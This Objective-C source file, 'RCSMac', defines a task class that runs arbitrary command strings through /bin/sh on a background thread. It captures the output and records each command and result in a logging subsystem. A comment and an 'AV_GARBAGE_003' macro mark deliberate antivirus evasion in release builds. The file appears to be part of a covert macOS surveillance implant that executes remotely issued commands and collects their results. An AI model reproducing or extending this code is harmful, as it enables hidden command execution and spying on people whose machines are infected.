//
//  __m_Task.m
//  RCSMac
//
//  Created by armored on 2/26/13.
//
//

#import "RCSMTask.h"
#import "RCSMLogManager.h"

#import "RCSMAVGarbage.h"


@implementation __m_Task

- (id)init
{
  if (self = [super init])
  {
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    mArgs = [[NSMutableArray alloc] initWithCapacity:0];
    
    return self;
  }
  
  return nil;
}

- (void)dealloc
{
  [super dealloc];
  
  [mArgs release];
}

- (BOOL)writeCmdLog:(NSString*)theCommand
          andOutput:(NSString*)theOutput
{
  BOOL bRet = FALSE;
  
  NSData *tmpCmdData = [theCommand dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *tmpOutputData = [theOutput dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
  
  int cmdDataLen = [tmpCmdData length];
  int outDataLen = [tmpOutputData length];
  
  NSMutableData *dataCmdHeader = [NSMutableData dataWithCapacity:0];
  [dataCmdHeader appendBytes: &cmdDataLen length:sizeof(int)];
  [dataCmdHeader appendBytes:[tmpCmdData bytes] length:cmdDataLen];
  
  NSMutableData *outCmdLog = [NSMutableData dataWithCapacity:0];
  //[outCmdLog appendBytes: &outDataLen length:sizeof(int)];
  [outCmdLog appendBytes:[tmpOutputData bytes] length:outDataLen];
  
  bRet = [[__m_MLogManager sharedInstance] createLog:LOG_COMMAND
                                         agentHeader:dataCmdHeader
                                           withLogID:0];
  
  if (bRet == TRUE)
  {
    [[__m_MLogManager sharedInstance] writeDataToLog:outCmdLog
                                            forAgent:LOG_COMMAND
                                           withLogID:0];
  }
  
  [[__m_MLogManager sharedInstance] closeActiveLog: LOG_COMMAND withLogID:0];
  
  return bRet;
}

- (void)execute:(NSString*)theCommand
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSString *result;
  
  NSPipe *rPipe = [[NSPipe alloc] init];
  NSFileHandle *readHandle = [rPipe fileHandleForReading];
  
  [mArgs addObject: @"-c"];
  [mArgs addObject: theCommand];
  
  NSTask *aTask = [[NSTask alloc] init];
  
  [aTask setLaunchPath: @"/bin/sh"];
  
  [aTask setArguments: mArgs];
  
  [aTask setStandardError: rPipe];
  [aTask setStandardOutput: rPipe];
  
  [aTask launch];
  
  [aTask waitUntilExit];
  
  NSMutableData *data = [[NSMutableData alloc] init];
  NSData *readData;
  
  while ((readData = [readHandle availableData])
         && [readData length]) {
    [data appendData: readData];
  }
  
  result = [[NSString alloc] initWithData: data encoding: NSUTF8StringEncoding];
  
  [data release];
  [rPipe release];
  [aTask release];
  
  if ([result length] > 0)
    [self writeCmdLog:theCommand andOutput:result];
  
  [pool release];
}

- (void)performCommand:(NSString*)aCommand
{
  [NSThread detachNewThreadSelector:@selector(execute:) toTarget:self withObject:aCommand];
}

@end
